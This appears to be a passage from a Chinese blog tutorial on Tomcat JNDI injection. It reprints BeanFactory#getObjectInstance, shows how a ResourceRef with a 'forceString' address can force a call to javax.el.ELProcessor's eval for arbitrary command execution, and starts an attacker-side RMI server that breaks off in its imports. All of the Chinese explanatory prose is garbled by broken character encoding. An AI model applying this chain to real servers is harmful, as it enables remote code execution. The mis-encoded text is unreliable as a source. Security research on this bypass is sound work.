<p><img src="https://i-blog.csdnimg.cn/blog_migrate/16da0a68c627fd17e0809e0d9e7b92ac.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿™é‡Œæˆ‘ä»¬ä¹‹é—´çœ‹org.apache.naming.factory.BeanFactory#getObjectInstanceæ–¹æ³•</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx,</span></span><br><span class="line"><span class="params">                                    Hashtable&lt;?,?&gt; environment)</span></span><br><span class="line">        <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> ResourceRef) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">                <span class="type">Reference</span> <span class="variable">ref</span> <span class="operator">=</span> (Reference) obj;</span><br><span class="line">                <span class="type">String</span> <span class="variable">beanClassName</span> <span class="operator">=</span> ref.getClassName();</span><br><span class="line">                Class&lt;?&gt; beanClass = <span class="literal">null</span>;</span><br><span class="line">                <span class="type">ClassLoader</span> <span class="variable">tcl</span> <span class="operator">=</span></span><br><span class="line">                    Thread.currentThread().getContextClassLoader();</span><br><span class="line">                <span class="keyword">if</span> (tcl != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        beanClass = tcl.loadClass(beanClassName);</span><br><span class="line">                    &#125; <span class="keyword">catch</span>(ClassNotFoundException e) &#123;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        beanClass = Class.forName(beanClassName);</span><br><span class="line">                    &#125; <span class="keyword">catch</span>(ClassNotFoundException e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (beanClass == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NamingException</span></span><br><span class="line">                        (<span class="string">&quot;Class not found: &quot;</span> + beanClassName);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="type">BeanInfo</span> <span class="variable">bi</span> <span class="operator">=</span> Introspector.getBeanInfo(beanClass);</span><br><span class="line">                PropertyDescriptor[] pda = bi.getPropertyDescriptors();</span><br><span class="line"></span><br><span class="line">                <span class="type">Object</span> <span class="variable">bean</span> <span class="operator">=</span> beanClass.newInstance();</span><br><span class="line"></span><br><span class="line">                <span class="comment">/* Look for properties with explicitly configured setter */</span></span><br><span class="line">                <span class="type">RefAddr</span> <span class="variable">ra</span> <span class="operator">=</span> ref.get(<span class="string">&quot;forceString&quot;</span>);</span><br><span class="line">                Map&lt;String, Method&gt; forced = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">                String value;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (ra != <span class="literal">null</span>) &#123;</span><br><span class="line">                    value = (String)ra.getContent();</span><br><span class="line">                    Class&lt;?&gt; paramTypes[] = <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">1</span>];</span><br><span class="line">                    paramTypes[<span class="number">0</span>] = String.class;</span><br><span class="line">                    String setterName;</span><br><span class="line">                    <span class="type">int</span> index;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">/* Items are given as comma separated list */</span></span><br><span class="line">                    <span class="keyword">for</span> (String param: value.split(<span class="string">&quot;,&quot;</span>)) &#123;</span><br><span class="line">                        param = param.trim();</span><br><span class="line">                        <span class="comment">/* A single item can either be of the form name=method</span></span><br><span class="line"><span class="comment">                         * or just a property name (and we will use a standard</span></span><br><span class="line"><span class="comment">                         * setter) */</span></span><br><span class="line">                        index = param.indexOf(<span class="string">&#x27;=&#x27;</span>);</span><br><span class="line">                        <span class="keyword">if</span> (index &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                            setterName = param.substring(index + <span class="number">1</span>).trim();</span><br><span class="line">                            param = param.substring(<span class="number">0</span>, index).trim();</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            setterName = <span class="string">&quot;set&quot;</span> +</span><br><span class="line">                                         param.substring(<span class="number">0</span>, <span class="number">1</span>).toUpperCase(Locale.ENGLISH) +</span><br><span class="line">                                         param.substring(<span class="number">1</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            forced.put(param,</span><br><span class="line">                                       beanClass.getMethod(setterName, paramTypes));</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (NoSuchMethodException|SecurityException ex) &#123;</span><br><span class="line">                            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NamingException</span></span><br><span class="line">                                (<span class="string">&quot;Forced String setter &quot;</span> + setterName +</span><br><span class="line">                                 <span class="string">&quot; not found for property &quot;</span> + param);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                Enumeration&lt;RefAddr&gt; e = ref.getAll();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">while</span> (e.hasMoreElements()) &#123;</span><br><span class="line"></span><br><span class="line">                    ra = e.nextElement();</span><br><span class="line">                    <span class="type">String</span> <span class="variable">propName</span> <span class="operator">=</span> ra.getType();</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (propName.equals(Constants.FACTORY) ||</span><br><span class="line">                        propName.equals(<span class="string">&quot;scope&quot;</span>) || propName.equals(<span class="string">&quot;auth&quot;</span>) ||</span><br><span class="line">                        propName.equals(<span class="string">&quot;forceString&quot;</span>) ||</span><br><span class="line">                        propName.equals(<span class="string">&quot;singleton&quot;</span>)) &#123;</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    value = (String)ra.getContent();</span><br><span class="line"></span><br><span class="line">                    Object[] valueArray = <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">                    <span class="comment">/* Shortcut for properties with explicitly configured setter */</span></span><br><span class="line">                    <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> forced.get(propName);</span><br><span class="line">                    <span class="keyword">if</span> (method != <span class="literal">null</span>) &#123;</span><br><span class="line">                        valueArray[<span class="number">0</span>] = value;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            method.invoke(bean, valueArray);</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (IllegalAccessException|</span><br><span class="line">                                 IllegalArgumentException|</span><br><span class="line">                                 InvocationTargetException ex) &#123;</span><br><span class="line">                            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NamingException</span></span><br><span class="line">                                (<span class="string">&quot;Forced String setter &quot;</span> + method.getName() +</span><br><span class="line">                                 <span class="string">&quot; threw exception for property &quot;</span> + propName);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">for</span> (i = <span class="number">0</span>; i&lt;pda.length; i++) &#123;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> (pda[i].getName().equals(propName)) &#123;</span><br><span class="line"></span><br><span class="line">                            Class&lt;?&gt; propType = pda[i].getPropertyType();</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">if</span> (propType.equals(String.class)) &#123;</span><br><span class="line">                                valueArray[<span class="number">0</span>] = value;</span><br><span class="line">                            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (propType.equals(Character.class)</span><br><span class="line">                                       || propType.equals(<span class="type">char</span>.class)) &#123;</span><br><span class="line">                                valueArray[<span class="number">0</span>] =</span><br><span class="line">                                    Character.valueOf(value.charAt(<span class="number">0</span>));</span><br><span class="line">                            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (propType.equals(Byte.class)</span><br><span class="line">                                       || propType.equals(<span class="type">byte</span>.class)) &#123;</span><br><span class="line">                                valueArray[<span class="number">0</span>] = Byte.valueOf(value);</span><br><span class="line">                            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (propType.equals(Short.class)</span><br><span class="line">                                       || propType.equals(<span class="type">short</span>.class)) &#123;</span><br><span class="line">                                valueArray[<span class="number">0</span>] = Short.valueOf(value);</span><br><span class="line">                            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (propType.equals(Integer.class)</span><br><span class="line">                                       || propType.equals(<span class="type">int</span>.class)) &#123;</span><br><span class="line">                                valueArray[<span class="number">0</span>] = Integer.valueOf(value);</span><br><span class="line">                            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (propType.equals(Long.class)</span><br><span class="line">                                       || propType.equals(<span class="type">long</span>.class)) &#123;</span><br><span class="line">                                valueArray[<span class="number">0</span>] = Long.valueOf(value);</span><br><span class="line">                            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (propType.equals(Float.class)</span><br><span class="line">                                       || propType.equals(<span class="type">float</span>.class)) &#123;</span><br><span class="line">                                valueArray[<span class="number">0</span>] = Float.valueOf(value);</span><br><span class="line">                            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (propType.equals(Double.class)</span><br><span class="line">                                       || propType.equals(<span class="type">double</span>.class)) &#123;</span><br><span class="line">                                valueArray[<span class="number">0</span>] = Double.valueOf(value);</span><br><span class="line">                            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (propType.equals(Boolean.class)</span><br><span class="line">                                       || propType.equals(<span class="type">boolean</span>.class)) &#123;</span><br><span class="line">                                valueArray[<span class="number">0</span>] = Boolean.valueOf(value);</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NamingException</span></span><br><span class="line">                                    (<span class="string">&quot;String conversion for property &quot;</span> + propName +</span><br><span class="line">                                     <span class="string">&quot; of type &#x27;&quot;</span> + propType.getName() +</span><br><span class="line">                                     <span class="string">&quot;&#x27; not available&quot;</span>);</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="type">Method</span> <span class="variable">setProp</span> <span class="operator">=</span> pda[i].getWriteMethod();</span><br><span class="line">                            <span class="keyword">if</span> (setProp != <span class="literal">null</span>) &#123;</span><br><span class="line">                                setProp.invoke(bean, valueArray);</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NamingException</span></span><br><span class="line">                                    (<span class="string">&quot;Write not allowed for property: &quot;</span></span><br><span class="line">                                     + propName);</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (i == pda.length) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NamingException</span></span><br><span class="line">                            (<span class="string">&quot;No set method found for property: &quot;</span> + propName);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> bean;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">catch</span> (java.beans.IntrospectionException ie) &#123;</span><br><span class="line">                <span class="type">NamingException</span> <span class="variable">ne</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NamingException</span>(ie.getMessage());</span><br><span class="line">                ne.setRootCause(ie);</span><br><span class="line">                <span class="keyword">throw</span> ne;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (java.lang.IllegalAccessException iae) &#123;</span><br><span class="line">                <span class="type">NamingException</span> <span class="variable">ne</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NamingException</span>(iae.getMessage());</span><br><span class="line">                ne.setRootCause(iae);</span><br><span class="line">                <span class="keyword">throw</span> ne;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (java.lang.InstantiationException ie2) &#123;</span><br><span class="line">                <span class="type">NamingException</span> <span class="variable">ne</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NamingException</span>(ie2.getMessage());</span><br><span class="line">                ne.setRootCause(ie2);</span><br><span class="line">                <span class="keyword">throw</span> ne;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (java.lang.reflect.InvocationTargetException ite) &#123;</span><br><span class="line">                <span class="type">Throwable</span> <span class="variable">cause</span> <span class="operator">=</span> ite.getCause();</span><br><span class="line">                <span class="keyword">if</span> (cause <span class="keyword">instanceof</span> ThreadDeath) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> (ThreadDeath) cause;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (cause <span class="keyword">instanceof</span> VirtualMachineError) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> (VirtualMachineError) cause;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="type">NamingException</span> <span class="variable">ne</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NamingException</span>(ite.getMessage());</span><br><span class="line">                ne.setRootCause(ite);</span><br><span class="line">                <span class="keyword">throw</span> ne;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>è¯¥å‡½æ•°æ¥å—ä¸‰ä¸ªé‡è¦å‚æ•°ï¼Œä¸€ä¸ªæ˜¯æˆ‘ä»¬ä»æ³¨å†Œä¸­å¿ƒè¿œç¨‹è·å–çš„Refå¯¹æ–°å¨˜ï¼Œä¸€ä¸ªæ˜¯æˆ‘ä»¬JNDIæŸ¥è¯¢çš„nameï¼Œä¸€ä¸ªæ˜¯æˆ‘ä»¬æ³¨å†Œä¸­å¿ƒçš„ä¸Šä¸‹æ–‡registryContext<br>è¯¥æ–¹æ³•é¦–å…ˆåˆ¤æ–­æˆ‘ä¹ˆçš„æ–¹æ³•æ˜¯å¦æ˜¯ResourceRefçš„å®ä¾‹å¯¹è±¡ï¼ŒæŒ‰ç…§æˆ‘ä»¬ä¸Šä¸€ç¯‡æ–‡ç« çš„æ¶æ„ç±»æ¥è¯´ï¼Œæˆ‘ä»¬çš„Refå¯¹è±¡æ˜¯Referenceçš„å®ä¾‹å¯¹è±¡è€ŒReferenceæ˜¯ä¸€ä¸ªæ¥å£å¹¶æ²¡æœ‰é›†æˆå…¶ä»–çš„ç±»ï¼Œé‚£ä¹ˆå¦‚æœè¿˜æ˜¯ç›´æ¥ä½¿ç”¨Referenceå®ä¾‹çš„haulå°±ä¸æ»¡è¶³è¿™ä¸ªæ¡ä»¶ï¼Œä»£ç ç›´æ¥å°±ç»“æŸäº†ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬é¦–å…ˆå¾—ä¿è¯æˆ‘ä»¬è¿œç¨‹æ³¨å†Œçš„å¯¹è±¡æ˜¯ResourceRefçš„å®ä¾‹ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¹‹å®¶æ¸ é“ResourceRefè¿™ä¸ªç±»çœ‹çœ‹<br><img src="https://i-blog.csdnimg.cn/blog_migrate/f47ba10d795bcb3cf11226abc689cc2a.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ³¨æ„åˆ°è¯¥ç±»ç»§æ‰¿äº†Referenceç±»ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ³¨å†Œçš„è¿œç¨‹Referenceå¯¹è±¡ä¹Ÿå¯ä»¥æ˜¯ResourceRefçš„å®ä¾‹å¯¹è±¡ã€‚è¿™å°±è§£å†³äº†ç¬¬ä¸€ä¸ªé—®é¢˜ã€‚<br>åœ¨org.apache.naming.factory.BeanFactory#getObjectInstanceæ–¹æ³•ç¬¬124è¡Œä¼šè°ƒç”¨ä¸€æ¬¡ResourceRefçš„getClassnameæ–¹æ³•ï¼Œæˆ‘ä»¬ç›´æ¥çœ‹è¿™ä¸ªæ–¹æ³•ã€‚<br><img src="https://i-blog.csdnimg.cn/blog_migrate/7b1e710c4915c225612fa91a1396f078.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç›´æ¥æ”¾å›äº†å˜é‡classNameï¼Œæˆ‘ä»¬çœ‹çœ‹æ€ä¹ˆèµ‹å€¼çš„<br><img src="https://i-blog.csdnimg.cn/blog_migrate/f030fd29eb22fcdcee31bf199bb96345.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://i-blog.csdnimg.cn/blog_migrate/29e4acb45cff84557ab951a2911e0c3b.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>Referenceå®ä¾‹åŒ–çš„æ—¶å€™é€šè¿‡æœ‰å‚æ„é€ æ–¹æ³•èµ‹å€¼çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬åœ¨æ„é€ è¿œç¨‹å¯¹è±¡çš„æ—¶å€™å¹¶æ²¡æœ‰æ˜¾å¼å¾—æ„é€ Referenceå¯¹è±¡ï¼Œæ‰€ä»¥å…¶èµ‹å€¼æ¥è‡ªäºResourceRefç±»å®ä¾‹åŒ–è¿‡ç¨‹ä¸­<br><img src="https://i-blog.csdnimg.cn/blog_migrate/73479ec92550904a42086ab6b03bc276.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç¬¬105è¡Œè°ƒç”¨äº†çˆ¶ç±»çš„æ„é€ æ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯å¦‚æœæˆ‘ä»¬ä¼ å…¥7ä¸ªå‚æ•°å¯¹ResourceRefè¿›è¡Œå®ä¾‹åŒ–ï¼Œä¾¿ä¼šè°ƒç”¨åˆ°Refernceçš„å®ä¾‹åŒ–è¿‡ç¨‹ï¼Œä¸”ç¬¬ä¸€ä¸ªå‚æ•°å°±æ˜¯getClassæœ€ç»ˆè¿”å›çš„ç±»åã€‚ç„¶åå°±æ˜¯æ ¹æ®è¯¥ç±»åä½¿ç”¨åå°„æœºåˆ¶å®ä¾‹åŒ–è¯¥ç±»ï¼Œä¹Ÿå°±æ˜¯è¯´è¯¥ç±»ä¹Ÿåº”è¯¥æ˜¯Clientå­˜åœ¨çš„ç±»ã€‚<br><img src="https://i-blog.csdnimg.cn/blog_migrate/772102d147ee1b3f1b0d32d9808a0c6a.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç„¶åé‡ç‚¹æ¥åˆ°ç¬¬151è¡Œï¼Œè¿™é‡Œè°ƒç”¨refå¯¹è±¡çš„getæ–¹æ³•ï¼Œä¼ å…¥å­—ç¬¦ä¸²forceStringï¼Œæœ€ç»ˆè¿”å›çš„æ˜¯ä¸€ä¸ªRefAddrå¯¹è±¡ï¼Œæˆ‘ä»¬é‡ç‚¹å…³æ³¨ä¸€ä¸‹è¿™ä¸ªæ–¹æ³•ã€‚<br><img src="https://i-blog.csdnimg.cn/blog_migrate/ef07bb3c97d99dcf0945ccf8d8c008c4.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿™é‡Œæœ‰ä¸€ä¸ªé‡è¦çš„å¯¹è±¡addrs<br><img src="https://i-blog.csdnimg.cn/blog_migrate/5254d6131c287c3c938ed160c7247b82.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://i-blog.csdnimg.cn/blog_migrate/eaac54745dbc65122cb7a88b87c09a7c.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://i-blog.csdnimg.cn/blog_migrate/9fd25159df16cd17b8187ced78003933.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å…¶å®å°±æ˜¯ä¸€ä¸ªåˆ—è¡¨ï¼Œå…¶ä¸­å­˜çš„æ•°æ®ç±»å‹ä¸ºRefAddrå¯¹è±¡ï¼Œæ‰€ä»¥ä¸Šé¢è°ƒç”¨äº†å…¶sizeæ–¹æ³•è·å–äº†åˆ—è¡¨çš„å¤§å°ï¼Œæ‰€ä»¥getæ–¹æ³•çš„é€»è¾‘ä¹Ÿå°±æ¸…æ¥šäº†ï¼Œéå†åˆ—è¡¨ä¸­çš„æ¯ä¸€ä¸ªå…ƒç´ è°ƒç”¨å…¶getTypeæ–¹æ³•è·å–åˆ°typeç„¶åä¸æˆ‘ä»¬ä¼ å…¥çš„å­—ç¬¦ä¸²æ¯”è¾ƒï¼Œå¦‚æœç›¸ç­‰åˆ™è¿”å›è¯¥RefAddrå¯¹è±¡<br>é‚£ä¹ˆè¿™ä¸ªRefAddrå¯¹è±¡å¯ä»¥é€šè¿‡ä»€ä¹ˆæ–¹å¼æ·»åŠ å‘¢ï¼Ÿæˆ‘åœ¨Referenceç±»ä¸­æ‰¾åˆ°äº†<br><img src="https://i-blog.csdnimg.cn/blog_migrate/411976e38790da4284fc370c4b456ef5.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>é‚£ä¹ˆå†ResourceRefç±»ä¸­åŒæ ·å¯ä»¥é€šè¿‡ä¸€æ ·çš„æ–¹å¼æ·»åŠ ï¼Œæˆ‘ä»¬åªéœ€è°ƒç”¨addæ–¹æ³•ï¼Œä¼ å…¥RefAddrå¯¹è±¡å°±å¯ä»¥äº†ã€‚å›åˆ°BeanFactoryç±»ï¼Œè¿™é‡Œè°ƒç”¨å®Œgetæ–¹æ³•åï¼Œè·å¾—äº†RefAddrç±»å‹çš„å˜é‡ï¼Œç„¶åè°ƒç”¨äº†å…¶getContentæ–¹æ³•ï¼Œæˆ‘ä»¬åˆæ¥çœ‹çœ‹è¿™ä¸ªæ–¹æ³•å¹²äº†å•¥ã€‚<br><img src="https://i-blog.csdnimg.cn/blog_migrate/9f95756433c5f86659349b4937aaf350.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬å‘ç°è¿™æ˜¯ä¸€ä¸ªæŠ½è±¡ç±»ï¼Œæ²¡æœ‰å…·ä½“çš„å®ç°ï¼Œæ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨å¿«æ·é”®ctrl+alt+bæ‰¾ä¸€ä¸ªå®ç°ç±»<br><img src="https://i-blog.csdnimg.cn/blog_migrate/d5c8e3a00edcd7ba2e4326ea5633c61d.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿™é‡Œcontentsæ¥è‡ªäºStringRefAddråˆå§‹åŒ–çš„æ—¶å€™ä¼ å…¥çš„å˜é‡addrï¼Œæ³¨æ„åˆ°è¿˜æœ‰ä¸€ä¸ªå˜é‡addrTypeé€šè¿‡å…¶çˆ¶ç±»ä¼ å…¥<br><img src="https://i-blog.csdnimg.cn/blog_migrate/5aa8b1a6f8b49ec231f86ff22878e2af.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å¯ä»¥æ„å»ºä¸€ä¸ªStringRefAddrå¯¹è±¡ new StringRefAddr(â€œaddrTypeâ€, â€œaddrâ€)ï¼Œè¿™ä¸€éƒ¨åˆ†å¯ä»¥æ€»ç»“ä¸€ä¸‹ï¼Œåˆ›å»ºä¸€ä¸ªResourceRefå¯¹è±¡ï¼Œç„¶åè°ƒç”¨å…¶addæ–¹æ³•å¯ä»¥ä¼ å…¥ä¸€ä¸ªStringRefAddrå¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ResourceRef</span> <span class="variable">resourceRef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;ResourceClass&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;addr&quot;</span>));</span><br></pre></td></tr></table></figure>
<p>åœ¨æ‰§è¡Œå®ŒgetContentæ–¹æ³•åä¼šè¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ä¹Ÿå°±æ˜¯ä¸Šé¢æåˆ°çš„addrï¼Œèµ‹å€¼ç»™valueï¼Œç„¶åé€šè¿‡<code>,</code>åˆ†å‰²åå¾ªç¯å¤„ç†æ¯ä¸€éƒ¨åˆ†ã€‚é’ˆå¯¹æ¯ä¸€éƒ¨åˆ†é€šè¿‡<code>=</code>åˆ†å‰²ï¼Œç­‰å·å‰é¢çš„éƒ¨åˆ†èµ‹å€¼ç»™param,ç­‰å·åé¢çš„éƒ¨åˆ†èµ‹å€¼ç»™setterNameï¼Œç„¶åä»¥setterNameä½œä¸ºæ–¹æ³•ååˆ©ç”¨åå°„çš„æ–¹å¼è·å–ä¸Šé¢æåˆ°çš„Classå¯¹è±¡å¯¹åº”çš„Methodå¯¹è±¡ï¼Œæ³¨æ„åˆ°è¯¥æ–¹æ³•åªèƒ½æ¥å—ä¸€ä¸ªStringç±»å‹çš„å‚æ•°ï¼Œç„¶åè®²è¯¥Methodæ–¹æ³•ä½œä¸ºå€¼ï¼Œparamä½œä¸ºé”®å­˜å…¥ä¸€ä¸ªHashMap å˜é‡åforcedã€‚<br><img src="https://i-blog.csdnimg.cn/blog_migrate/73332102770d06d4aead448b40f719c1.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>ç„¶åä¼šè°ƒç”¨ResourceRef#getAllæ–¹æ³•è·å–å®ä¾‹åŒ–è¿‡ç¨‹ä¸­ä¼ å…¥çš„æ‰€æœ‰å‚æ•°å¹¶å­˜å…¥æšä¸¾ç±»å‹ä¸­ã€‚ç„¶åä¸€ä¸ªä¸€ä¸ªçš„è¿­ä»£è·å–å…¶addrTypeï¼Œç›´åˆ°å…¶ä¸ç­‰äºscopeã€factoryã€authã€singletonã€forceStringä¹‹åè¿›å…¥ä¸‹é¢çš„æ­¥éª¤ï¼Œå‡è®¾æˆ‘ä»¬åœ¨è°ƒç”¨ResourceRefçš„addæ–¹æ³•æ—¶åè®¾ç½®äº†ä¸€ä¸ªaddrTypeï¼Œä¸ºaä¹Ÿå°±æ˜¯new ResourceRef().add(new StringAddrRef(â€œaâ€, â€œåœ°å€ç±»å‹â€))ï¼Œåœ¨202è¡Œå°±ä¼šè°ƒç”¨StringRefAddrçš„getContentsæ–¹æ³•è·å–åˆ°â€œåœ°å€ç±»å‹â€èµ‹å€¼ç»™valueã€‚<br><img src="https://i-blog.csdnimg.cn/blog_migrate/20d1e2db09bcb6f00b50cc595f6c71cf.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç„¶åå†ä½207è¡Œä»ä¸Šé¢forcedè¿™ä¸ªHashMapä¸­å–å‡ºaå¯¹åº”çš„Methodï¼Œç„¶ååˆ©ç”¨åå°„æœºåˆ¶è°ƒç”¨è¯¥Methodçš„invokeæ–¹æ³•å°†å°è£…æˆæ•°ç»„çš„valueä½œä¸ºå‚æ•°è·µè¡Œè°ƒç”¨ã€‚é‚£ä¹ˆå¦‚æœæˆ‘æ‰¾åˆ°ä¸€ä¸ªæœ¬åœ°Classï¼Œç„¶åå…¶æœ‰ä¸€ä¸ªæ–¹æ³•å¯ä»¥è¿›è¡Œä»»æ„å‘½ä»¤æ‰§è¡Œå²‚ä¸ç¾æ»‹æ»‹ã€‚ã€‚ã€‚<br>è¿™ä¸ªç±»å°±æ˜¯<code>javax.el.ELProcessor</code><br><img src="https://i-blog.csdnimg.cn/blog_migrate/9969d2f67ba634f2acd3a466363aa733.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä½¿ç”¨å…¶evalæ–¹æ³•å³å¯æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ‰€ä»¥æˆ‘ä»¬çš„æœåŠ¡ç«¯å†™æ³•ä¹Ÿå°±å‡ºæ¥äº†</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.armandhe.jnditest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> 